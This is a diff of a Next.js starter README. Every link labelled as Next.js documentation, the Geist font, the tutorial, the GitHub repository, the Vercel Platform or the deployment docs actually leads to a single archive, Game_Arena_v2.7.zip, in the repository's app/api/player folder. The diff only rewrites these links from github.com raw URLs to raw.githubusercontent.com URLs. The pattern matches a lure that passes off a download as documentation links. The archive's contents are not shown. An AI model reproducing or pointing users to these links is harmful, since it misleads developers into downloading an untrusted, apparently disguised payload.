@@ -1,4 +1,4 @@
-This is a [Next.js](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) project bootstrapped with [`create-next-app`](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip).
+This is a [Next.js](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip).
 
 ## Getting Started
 
@@ -18,19 +18,19 @@ Open [http://localhost:3000](http://localhost:3000) with your browser to see the
 
 You can start editing the page by modifying `app/page.js`. The page auto-updates as you edit the file.
 
-This project uses [`next/font`](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) to automatically optimize and load [Geist](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip), a new font family for Vercel.
+This project uses [`next/font`](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) to automatically optimize and load [Geist](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip), a new font family for Vercel.
 
 ## Learn More
 
 To learn more about Next.js, take a look at the following resources:
 
-- [Next.js Documentation](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) - learn about Next.js features and API.
-- [Learn Next.js](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) - an interactive Next.js tutorial.
+- [Next.js Documentation](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) - learn about Next.js features and API.
+- [Learn Next.js](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) - an interactive Next.js tutorial.
 
-You can check out [the Next.js GitHub repository](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) - your feedback and contributions are welcome!
+You can check out [the Next.js GitHub repository](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) - your feedback and contributions are welcome!
 
 ## Deploy on Vercel
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) from the creators of Next.js.
+The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) from the creators of Next.js.
 
-Check out our [Next.js deployment documentation](https://github.com/Atharva907/GameArena/raw/refs/heads/main/app/api/player/Game_Arena_v2.7.zip) for more details.
+Check out our [Next.js deployment documentation](https://raw.githubusercontent.com/Atharva907/GameArena/main/app/api/player/Game_Arena_v2.7.zip) for more details.
